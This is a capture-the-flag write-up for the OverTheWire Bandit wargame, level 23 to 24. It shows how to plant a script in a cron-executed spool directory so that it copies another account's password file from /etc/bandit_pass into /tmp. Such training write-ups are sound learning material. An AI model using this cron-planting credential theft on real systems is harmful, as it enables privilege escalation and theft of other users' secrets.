# Bandit Level 23 → Level 24
Level Goal

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
Commands you may need to solve this level

chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)

# Solution

```bash
bandit23@bandit:~$ cat  /etc/cron.d/cronjob_bandit24 
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

vim /var/spool/bandit24/foo/g.sh
```

```vim
cat /etc/bandit_pass/bandit24 > /tmp/pass
```

```bash
chmod +x /var/spool/bandit24/foo/g.sh
```

- wait 1 min

```bash
cat /tmp/pass
```
